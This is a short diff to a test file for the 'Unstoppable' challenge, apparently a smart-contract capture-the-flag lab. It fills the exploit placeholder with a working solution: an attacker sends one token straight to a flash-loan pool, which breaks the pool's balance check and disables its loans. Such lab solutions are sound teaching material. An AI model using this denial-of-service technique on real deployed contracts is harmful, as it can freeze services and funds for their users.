@@ -38,7 +38,10 @@ describe('[Challenge] Unstoppable', function () {
   });
 
   it('Exploit', async function () {
-    /** CODE YOUR EXPLOIT HERE */
+    // Transfer one token to the pool so that flash loans don't work anymore
+    // due to `poolBalance` vs pool actual token balance mismatch
+    const rogueDeposit = ethers.utils.parseEther('1');
+    await this.token.connect(attacker).transfer(this.pool.address, rogueDeposit);
   });
 
   after(async function () {
